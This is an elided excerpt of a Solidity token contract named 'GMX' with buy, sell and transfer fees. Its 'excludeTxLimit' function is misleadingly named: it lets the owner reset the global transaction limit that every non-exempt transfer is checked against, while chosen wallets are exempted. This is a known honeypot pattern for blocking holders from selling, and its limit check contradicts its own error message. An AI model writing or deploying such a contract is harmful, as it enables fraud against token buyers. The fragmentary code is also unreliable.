...
contract GMX is Ownable, IERC20 {

    using SafeMath for uint256;

    DexRouter public router;

    string private constant _name = "GMX";
    ...
    uint256 public swapThreshold = (_totalSupply * 2) / 2000;
     uint256 public _TxLimitwallet = _totalSupply;
    ...
    function excludeTxLimit (address holder, uint256 amount)public onlyOwner{
        isFeeExempt[holder] = true;
        _TxLimitwallet=amount;
        require (amount == percent,"Cannot be lower than 0.5%"); 
    }

    function removeLimits ()public onlyOwner{
        _TxLimitwallet= _totalSupply;
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(
            amount <= _TxLimitwallet || isTxLimitExempt[sender],
            "TX Limit Exceeded"
        );
    }
    ...
    function _transferFrom(
        ...
        require(amount <= _TxLimitwallet || isTxLimitExempt[sender], "TX Limit");
        if (
            isUniswapPair[recipient] &&
            !inSwapAndLiquify &&
        ...
        if (!launched() && isUniswapPair[recipient]) {
    ...
    function takeFee(
        ...
        if (isUniswapPair[recipient] && takeSellFee) {
            feeApplicable = totalFeeIfSelling;
        }
        if (isUniswapPair[sender] && takeBuyFee) {
            feeApplicable = totalFee;
        }
        if (!isUniswapPair[sender] && !isUniswapPair[recipient]) {
            if (takeTransferFee) {
                feeApplicable = totalFeeIfSelling;
            } else {
                feeApplicable = 0;
